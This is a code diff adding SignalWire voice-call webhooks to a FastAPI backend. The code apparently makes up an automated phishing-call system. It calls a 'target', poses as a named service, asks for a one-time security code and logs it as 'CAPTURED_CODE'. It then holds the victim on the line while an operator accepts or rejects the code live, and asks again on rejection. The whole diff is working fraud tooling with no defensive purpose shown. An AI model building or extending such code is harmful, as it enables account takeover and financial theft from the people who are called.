@@ -1032,6 +1032,265 @@ async def get_call_types():
         {"id": "custom", "name": "Custom Script"},
     ]
 
+# ===================
+# SignalWire Webhooks
+# ===================
+
+# Store call state for SignalWire (since webhooks are stateless)
+signalwire_call_states: Dict[str, Dict] = {}
+
+@api_router.post("/signalwire-webhook/voice")
+async def signalwire_voice_webhook(request: Request):
+    """Handle SignalWire voice webhook - returns LaML/XML for IVR"""
+    try:
+        form_data = await request.form()
+        data = dict(form_data)
+        logger.info(f"SignalWire Voice Webhook: {json.dumps(data)}")
+        
+        call_sid = data.get("CallSid", "")
+        digits = data.get("Digits", "")
+        call_status = data.get("CallStatus", "")
+        
+        # Find our call by SignalWire call SID
+        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
+        
+        if not call_log:
+            # Return basic response if call not found
+            return create_laml_response("Sorry, there was an error. Goodbye.", hangup=True)
+        
+        call_id = call_log["id"]
+        current_step = call_log.get("current_step", "step1")
+        steps = call_log.get("steps", {})
+        config = call_log.get("config", {})
+        
+        # Process based on current step
+        if not digits:
+            # No digits received yet - play the appropriate message
+            if current_step == "step1":
+                await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
+                await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 or 0")
+                
+                message = format_tts_message(steps.get("step1", ""), config)
+                return create_laml_gather(message, num_digits=1, action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+            
+            elif current_step == "step2":
+                await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
+                
+                message = format_tts_message(steps.get("step2", ""), config)
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+            
+            elif current_step == "step3":
+                await add_call_event(call_id, "STEP3_PLAYING", "Playing wait message")
+                await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
+                
+                message = format_tts_message(steps.get("step3", ""), config)
+                # Hold the call - wait for verification
+                return create_laml_response(message, pause=60, loop=True)
+            
+            elif current_step == "rejected":
+                await add_call_event(call_id, "STEP2_PLAYING", "Asking for code again (retry)")
+                
+                message = format_tts_message(steps.get("rejected", ""), config)
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+            
+            elif current_step == "accepted":
+                await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing accepted message")
+                
+                message = format_tts_message(steps.get("accepted", ""), config)
+                return create_laml_response(message, hangup=True)
+        
+        else:
+            # Digits received
+            if current_step == "step1":
+                await add_call_event(call_id, "INPUT_STREAM", f"{digits}... (Step 1 Complete)", digits)
+                
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"dtmf_step1": digits, "current_step": "step2"}}
+                )
+                
+                # Move to step 2
+                await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
+                
+                message = format_tts_message(steps.get("step2", ""), config)
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+            
+            elif current_step in ["step2", "rejected"]:
+                otp_digits = config.get("otp_digits", 6)
+                
+                # Stream digits
+                for i, digit in enumerate(digits):
+                    if i < len(digits) - 1:
+                        await add_call_event(call_id, "INPUT_STREAM", f"Receiving: {digits[:i+1]}...")
+                
+                await add_call_event(call_id, "CAPTURED_CODE", f"Security code: {digits}", digits, show_verify=True)
+                
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"dtmf_code": digits, "current_step": "step3", "awaiting_verification": True},
+                     "$push": {"dtmf_codes_history": digits}}
+                )
+                
+                # Move to step 3 (waiting)
+                await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify...")
+                await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
+                
+                message = format_tts_message(steps.get("step3", ""), config)
+                return create_laml_response(message, pause=60, loop=True)
+        
+        return create_laml_response("Thank you. Goodbye.", hangup=True)
+        
+    except Exception as e:
+        logger.error(f"SignalWire voice webhook error: {e}")
+        return create_laml_response("Sorry, an error occurred. Goodbye.", hangup=True)
+
+@api_router.post("/signalwire-webhook/status")
+async def signalwire_status_webhook(request: Request):
+    """Handle SignalWire call status webhook"""
+    try:
+        form_data = await request.form()
+        data = dict(form_data)
+        logger.info(f"SignalWire Status Webhook: {json.dumps(data)}")
+        
+        call_sid = data.get("CallSid", "")
+        call_status = data.get("CallStatus", "")
+        
+        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
+        
+        if call_log:
+            call_id = call_log["id"]
+            
+            if call_status == "ringing":
+                await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
+                await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
+            
+            elif call_status == "in-progress":
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}}
+                )
+            
+            elif call_status == "completed":
+                duration = int(data.get("CallDuration", 0))
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"status": "FINISHED", "ended_at": datetime.now(timezone.utc).isoformat(), "duration_seconds": duration}}
+                )
+                await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration}s")
+            
+            elif call_status in ["busy", "no-answer", "failed", "canceled"]:
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"status": "FAILED", "error_message": call_status}}
+                )
+                await add_call_event(call_id, "CALL_FAILED", f"Call failed: {call_status}")
+        
+        return {"status": "received"}
+        
+    except Exception as e:
+        logger.error(f"SignalWire status webhook error: {e}")
+        return {"status": "error"}
+
+@api_router.post("/signalwire-webhook/continue/{call_id}")
+async def signalwire_continue_call(call_id: str, action: str = "accepted"):
+    """Continue SignalWire call after Accept/Deny decision"""
+    try:
+        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
+        if not call_log:
+            raise HTTPException(status_code=404, detail="Call not found")
+        
+        steps = call_log.get("steps", {})
+        config = call_log.get("config", {})
+        call_sid = call_log.get("signalwire_call_sid")
+        
+        if not call_sid:
+            return {"status": "error", "message": "No SignalWire call SID"}
+        
+        import base64
+        auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
+        auth_bytes = base64.b64encode(auth_string.encode()).decode()
+        
+        if action == "accepted":
+            message = format_tts_message(steps.get("accepted", "Thank you. Goodbye."), config)
+            laml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say>{message}</Say>
+    <Hangup/>
+</Response>"""
+        else:
+            message = format_tts_message(steps.get("rejected", ""), config)
+            laml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather numDigits="{config.get('otp_digits', 6)}" action="{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice">
+        <Say>{message}</Say>
+    </Gather>
+</Response>"""
+        
+        # Update call with new TwiML
+        async with httpx.AsyncClient() as client:
+            response = await client.post(
+                f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{call_sid}.json",
+                data={"Twiml": laml},
+                headers={
+                    "Authorization": f"Basic {auth_bytes}",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                timeout=30.0
+            )
+            logger.info(f"SignalWire continue call response: {response.status_code}")
+        
+        return {"status": "ok"}
+        
+    except Exception as e:
+        logger.error(f"SignalWire continue call error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+def format_tts_message(message: str, config: dict) -> str:
+    """Format TTS message with variables"""
+    return message.replace(
+        "{name}", config.get("recipient_name", "")
+    ).replace(
+        "{service}", config.get("service_name", "")
+    ).replace(
+        "{digits}", str(config.get("otp_digits", 6))
+    )
+
+def create_laml_response(message: str, hangup: bool = False, pause: int = 0, loop: bool = False) -> str:
+    """Create LaML/XML response for SignalWire"""
+    from fastapi.responses import Response
+    
+    laml = '<?xml version="1.0" encoding="UTF-8"?>\n<Response>\n'
+    laml += f'    <Say>{message}</Say>\n'
+    
+    if pause > 0:
+        if loop:
+            laml += f'    <Pause length="{pause}"/>\n'
+            laml += f'    <Redirect>{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice</Redirect>\n'
+        else:
+            laml += f'    <Pause length="{pause}"/>\n'
+    
+    if hangup:
+        laml += '    <Hangup/>\n'
+    
+    laml += '</Response>'
+    
+    return Response(content=laml, media_type="application/xml")
+
+def create_laml_gather(message: str, num_digits: int, action: str) -> str:
+    """Create LaML/XML Gather response for SignalWire"""
+    from fastapi.responses import Response
+    
+    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather numDigits="{num_digits}" action="{action}" timeout="10">
+        <Say>{message}</Say>
+    </Gather>
+    <Say>We did not receive any input. Goodbye.</Say>
+    <Hangup/>
+</Response>'''
+    
+    return Response(content=laml, media_type="application/xml")
+
 # Include router
 app.include_router(api_router)
 
